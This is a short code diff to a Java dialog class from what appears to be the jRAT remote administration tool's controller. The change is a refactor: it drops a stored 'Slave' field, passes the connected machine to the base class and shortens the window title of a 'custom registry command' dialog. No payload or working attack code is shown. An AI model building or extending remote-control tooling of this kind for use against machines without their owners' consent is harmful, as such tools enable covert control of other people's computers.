@@ -23,15 +23,13 @@ import se.jrat.controller.utils.IconUtils;
 public class DialogCustomRegQuery extends BaseDialog {
 
 	private JPanel contentPane;
-	private Slave slave;
 	private JComboBox comboBox;
 
 	public DialogCustomRegQuery(Slave sl) {
-		super();
+		super(sl);
 		setResizable(false);
 		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogCustomRegQuery.class.getResource("/icons/key-arrow.png")));
-		this.slave = sl;
-		setTitle("Custom registry command - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
+		setTitle("Custom registry command");
 
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 385, 119);
